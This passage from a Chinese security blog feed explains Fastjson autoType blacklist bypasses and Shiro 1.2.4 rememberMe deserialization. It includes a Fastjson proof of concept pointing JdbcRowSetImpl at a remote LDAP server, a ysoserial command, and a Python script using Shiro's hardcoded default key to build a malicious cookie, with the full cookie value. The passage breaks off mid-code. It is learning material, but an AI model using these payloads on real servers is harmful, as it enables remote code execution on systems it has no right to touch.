<code>AutoTypeSupport</code></p><blockquote><p>从1.2.41说起。在checkAutotype()函数中，会先检查传入的@type的值是否是在黑名单里，如果要反序列化的类不在黑名单中，那</p><p>么才会对其进行反序列化。问题来了，在反序列化前，会经过loadClass()函数进行处理，其中一个处理方法是：在加载类的时候会去</p><p>掉className前后的L和;。所以，如果我们传入Lcom.sun.rowset.JdbcRowSetImpl;，在经过黑白名单后，在加载类时会去掉前后的</p><p>L和;，就变成了com.sun.rowset.JdbcRowSetImpl，反序列化了恶意类。</p><p>更新了1.2.42，方法是先判断反序列化目标类的类名前后是不是<code>L</code>和<code>;</code>，如果是，那么先去掉L和;，再进行黑白名单校验（偷懒</p><p>qaq）。关于1.2.42绕过非常简单，只需要双写L和;，就可以在第一步去掉L和;后，与1.2.41相同。</p><p>更新也非常随意，在1.2.43中，黑白名单判断前，又增加了一个是否以LL开头的判断，如果以LL开头，那么就直接抛异常，非常随意</p><p>解决了双写的问题。但是除了L和;，FastJson在加载类的时候，不只对L和;这样的类进行特殊处理，[也对特殊处理了，所以，同样的</p><p>方式在前面添加[绕过了1.2.43及之前的补丁。</p><p>在1.2.44中，黑客们烦不烦，来了个狠的：只要你以<code>[</code>开头或者<code>;</code>结尾，我直接抛一个异常。如此，终于解决了缠绵多个版本的漏洞。</p></blockquote><h3 id="2、checkAutotype绕过"><a href="#2、checkAutotype绕过" class="headerlink" title="2、checkAutotype绕过"></a>2、checkAutotype绕过</h3><p>FastJson有一个全局缓存机制：在解析json数据前会先加载相关配置，调用 addBaseClassMappings() 和 loadClass() 函数将一些基础类和第三方库存放到 mappings 中（mappings 是 ConcurrentMap 类，所以我们在一次连接中传入两个键值 a 和 b ，之后在解析时，如果没有开启 autotype，会从 mappings 或 deserializers.findClass() 函数中获取反序列化的对应类，如果有，则直接返回绕过了黑名单。利用的是 java.lang.Class 类，其反序列化处理类 MiscCodec 类可以将任意类加载到 mappings 中，实现了目标。</p><p>第一步利用 java.lang.Class 将恶意类加载到 mappings 中；</p><p>第二步从在 checkAutoType 内部，没有开启 autotype ，直接从 mappings 中获取 mappings 中取出恶意类并绕过黑名单进行了反序列化。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101120042.png" alt="null"></p><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">testStr=&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://169.254.39.1:1389/is9aig&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro反序列化</title>
    <link href="/2025/10/21/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/10/21/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h1><h2 id="Shiro反序列化-1"><a href="#Shiro反序列化-1" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h2><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记一（原理篇）</a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>直接从github上clone代码到本地。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">git clone https://github.com/apache/shiro.git<br>cd shiro<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure><p>修改 pml.xml（路径为 \shiro\samples\web\pom.xml）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 添加 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>之后 maven 搭建，配置 tomcat 环境</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505867.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505841.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505868.png" alt="img"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞分析具体已经在 Java-sec-code 分析过了，就不再重复了：</p><p><strong>逻辑总结：</strong></p><p>当获取用户请求时，大致的关键处理过程如下：</p><ol><li><p>获取Cookie中rememberMe的值</p></li><li><p>对rememberMe进行Base64解码</p></li><li><p>使用AES进行解密</p></li><li><p>对解密的值进行反序列化</p></li></ol><p>由于AES加密的Key是硬编码的默认Key，因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，当</p><p>CookieRememberMeManager 对恶意的 rememberMe 进行以上过程处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(value = &quot;/shiro/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">shiro_deserialize</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse res)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(req, Constants.REMEMBER_ME_COOKIE);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);<br>        <span class="hljs-type">byte</span>[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(aesDecrypt);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        in.readObject();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        <span class="hljs-keyword">if</span> (CookieUtils.addCookie(res, <span class="hljs-string">&quot;rememberMe&quot;</span>, DELETE_ME))&#123;<br>            log.error(e.getMessage());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;RememberMe cookie decrypt error. Set deleteMe cookie success.&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Shiro deserialize&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Shiro  <code>rememberMe</code> 功能用于“记住登录状态”。它的设计逻辑是：</p><p>用户勾选“记住我”登录后，Shiro 把用户的认证信息<strong>序列化为字节流</strong>，用一个固定密钥（默认是 <code>kPH+bIxk5D2deZiIxcaaaA==</code>）用 AES 加密，Base64 编码后作为 <code>rememberMe</code> Cookie 发送给浏览器。当浏览器下次请求时，Shiro：读取 <code>rememberMe</code> Cookie，用同样的密钥进行解密，然后<strong>直接反序列化</strong>出用户对象，只要攻击者能控制 <code>rememberMe</code> Cookie 内容，<strong>就能构造恶意对象反序列化，从而执行任意代码。</strong></p><p><strong>漏洞利用：</strong></p><p>生成恶意序列化数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">java -jar ysoserial.jar CommonsBeanutils1 &quot;calc.exe&quot; &gt; payload.bin<br></code></pre></td></tr></table></figure><p>加密 Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Shiro 默认密钥</span><br>key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br><br><span class="hljs-comment"># 读取 payload</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\CTF-Tools\\ysoserial-master\\target\\payload.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    payload = f.read()<br><br><span class="hljs-comment"># 补齐为 16 的倍数 (PKCS5Padding)</span><br>pad = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(payload) % <span class="hljs-number">16</span><br>payload += <span class="hljs-built_in">bytes</span>([pad] * pad)<br><br><span class="hljs-comment"># AES-CBC 加密 (IV 随机生成)</span><br>iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span>  <span class="hljs-comment"># 实际攻击需随机 IV</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>encrypted = cipher.encrypt(payload)<br><br><span class="hljs-comment"># Base64 编码</span><br>rememberMe = base64.b64encode(iv + encrypted).decode()  <span class="hljs-comment"># Shiro 格式: IV+密文</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;恶意 Cookie:&quot;</span>, rememberMe)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">恶意 Cookie: <br>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<br></code></pre></td></tr></table></figure><p>发送 cookie 请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">Cookie: <br>rememberMe=AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/gdRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+2UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/gcYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+7imK4pCFGgBIqX+1G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw/W0VgEmjpG2OsLRtsCRddr8/Vky+6t5i76oEqDU8iPh/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/zvbXM/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/vO+kPojn/GA+H38ovGW6reqxHXooV655jmV155px5BFR/MvklhgGyiSPVNoPL567alnOsfhd2R2h3/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR/+RZR9Pdu65/KYqX85Fw1knJYNJF3wKT/uI8deF+D0b/Ib0rzkHWI2nFWQ24T+Zl1/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/AgzKBPup2b+3V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0KbKWo+8ZGYqH4sPJH4xJe1SlocC+hJpR+o+AHmD1S7cESYzXXQMMThHbcP2XD84AUvHWCE2N4R8CJBWKn6WlXPQDgQPjt7EQIQVZFExgSY8M/D0o9vQYfxibUt+7RgHQ+4QrZvqxkR9YcdXldx+Fvhjwz/fgg/rktKZf6KChS7vLrZSoIOLeO6a1BVVp9TQKHix1wTs5rTiQyNEBL2q1ZpCIoEbEhRFHeynOgtTjzuUrYZkSZQJ7Llrd8MvejJqCZW9ooOP38g5jmK8tZMX1+G5N/o2X0cKdGWLrUx5SArOLo5tf7LnUF716la/EnO/sgvPAq2URt0umwmnldywDMZl0ZQVQwHySRrl+qbJEnSrdQAppjPtHI4lnW9+SrqIqPbcUieH6yWi0HRrQQXgUUSMgEO2LR/p9cbqG+ouAeLL2RVCUyscWdpbT2k1Ffjpxq98yp7iu0SQScOAmB6eLUBJueow1p+Jl1L5xakot4cpS5TNEiyzGVdNTVr/M9SFzyQTARtW4HdKZoVU2VUMIZUScaudUl+Jjvwi/0haRw/emevd/wjsxM0y7EWaLyjn0NjgXiLpGkEh433iyTBF+0U3j87DAYmA2KKWHsr2aXryYCjJHhKCHXCTq3sEn5OwshulkaeVZaxiCkFx0NeLa37v66DnyctyjVTTIV9nMhKLC62UVFzwkppxwt2RQAgo/YvJHZrhV4SPFgZQMt07yvTCGOhRsWYev+IwidIHrcefeYPDuWTXsO9LAZu9dUTu7R5pM7u7oKbBPpXYuqiCVOm5HQOUPbS/kmBxGFZcEQhP+hI0SliS7+D0Az3YfLHX59AFfRwAN/R1RXkscsUxZ5FT43IcXEFoEsC1rIK46TJWiZErGsPGLphxXsLVrAu/1IlrSbwLp/lUFtJLzmN9LemI2WM1mhn6SiO1QNWX79hSHZjAZTytzSpRXewdcPCmztKIyFZEYLPQlzZ5opck7Vb+3sxqRYjWucGEnVn8zKdUG/6XG3n1PXReOaXu8ZcK+XcdK57tAwiW2i/4ewrWv6wK3vIZ1S7SecN8Ff7Kg/mNVnAKFNVU/4YgI0hi1tgoou2k89ieMdayFpxQPrsTQHf8TTSsVKzGnU125XYarMHAosNLm9H6dkt09i5Qg72HT/wKq7vkZGOLQ4U9egq3FRsxDL9sq1BayxIqPAVcfjfQ7Ft+e4nYJ0GKANDc8Hv/4ij9qIjJ2rD6f0GUuU0rBS8xFVLenvKPUjneFgDcCtJ2ZmdZJGbH8Wget9lkEYp4ioMR7GSYIJ21bNAX/3imJ21yF2Qt74Gamc1972lYhOEtVWQeYwsW5AsDYIr9hVNysJvlXS6Wq2ear/vv0wALrp8De4IIuAhTxVUj4B2a8i7TcY1wl2UmPMfjnzEpKIQZAeJ96ESqYQSCNhH11NNdL6+Zg9kGqy2Q/bW/1nlTjg+dVs7bd8hq7ZEWo9qFNpCUg9ulN27sZA+nP6tlQYLioDJQtv0uos7EHkLrY63BAwE3yabrxn3RkLnk8arqkedmOag46+vydoiyqzDvka5HuZN7ntLTcggMo4lfG0MhTQji21qbky7zEZxeWty55t/UhCCLVQQsBQcu4v3M6eNe9maR985c1Nw7opVGKb9p1MAm7OCOq4Hkl4rwyWjroSXEaJpjQCdAiikTrMsIj2YDr5kIN79WEITTbBB6iMEimvXpqcy1nqqnNN3D4yKlf2zmwKpyvDYCoz71RCO+1P9O8Js3RftXHrHew2X/Y/2sGrn8YuxthTUBLhA7aF6+jMzVzBhmRygBcrx5E3zkOPIyDwP9jheD9ghHEBvCJE5Se3kXmcY0dsOVZWp1yCSQShAZL0dfCCCcLzG1V/ydV1Y3q8Jt5Q2KslxZkyF5gR94O3/46aqAXSCxyoxT3Sh/SFZ+wEOcI/XOqGrg9J82FnTBCvVOOvtV3mF0KC/p3TD8ARmpy1xE+1kt9C+CjYL+QAS/G/AppCDhNKAhH6K4gOnSv7XkvbGmw0L5lXj0jxLItOL13xZ6zU0dcDR8LwybZnZadALqTLpFHaBdDEms2QtRn8sIiXvvWqPZvKdbgw3MRcVtA==<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147642.png" alt="null"></p><p>也可以利用工具：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147425.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147524.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101151464.png" alt="null"></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>重写readObject</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Serializable 接口表示这个类支持 Java 序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;qaz&quot;</span>;<br>    <span class="hljs-keyword">public</span> String gender=<span class="hljs-string">&quot;man&quot;</span>; <br><br>    <span class="hljs-comment">//构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDemo</span><span class="hljs-params">(String name,String gender)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>        System.out.println(name);<br>        System.out.println(gender);<br>    &#125;<br><br>    <span class="hljs-comment">//重写 readObject ，当使用 ObjectInputStream.readObject() 反序列化时，JVM 会自动检查类里是否有 private void readObject(ObjectInputStream) 方法，如果有，就会在恢复对象后调用它</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title 